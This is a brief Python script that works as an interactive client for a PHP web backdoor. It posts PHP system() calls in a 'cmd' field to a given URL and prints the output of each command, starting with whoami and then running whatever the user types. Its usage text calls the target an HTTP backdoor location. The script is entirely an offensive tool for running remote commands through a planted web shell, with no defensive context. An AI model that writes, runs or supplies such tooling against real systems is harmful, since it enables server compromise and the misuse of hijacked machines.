#!/usr/bin/python3
import requests
import sys
arguments=sys.argv
scriptname=arguments[0]
session=requests.Session()

if(len(arguments) == 2):
	url=arguments[1]
	command=""
	payload=f"system('whoami');"
	user=(session.post(url,data={"cmd":f"{payload}"}).text).strip()
	if user.strip() == '':
		print(f"No valid user found.Check connection")
		exit()
	while command != 'q':
		command=input(f"{user} > ")
		payload=f"system('{command} 2>/dev/null');"
		response=session.post(url,data={"cmd":f"{payload}"})
		content=response.text
		try:
			content=content.decode().strip()
		except:
			content=content.strip()

		print(f'{content}\n')
else:
	print(f'\tUsage : {scriptname} httpbackdoorlocation com')
	print(f'\t      : {scriptname} http://localhost/tests/c0ntacts.php')
	print(f'\t      : {scriptname} http://localhost/tests/c0ntacts.php ')
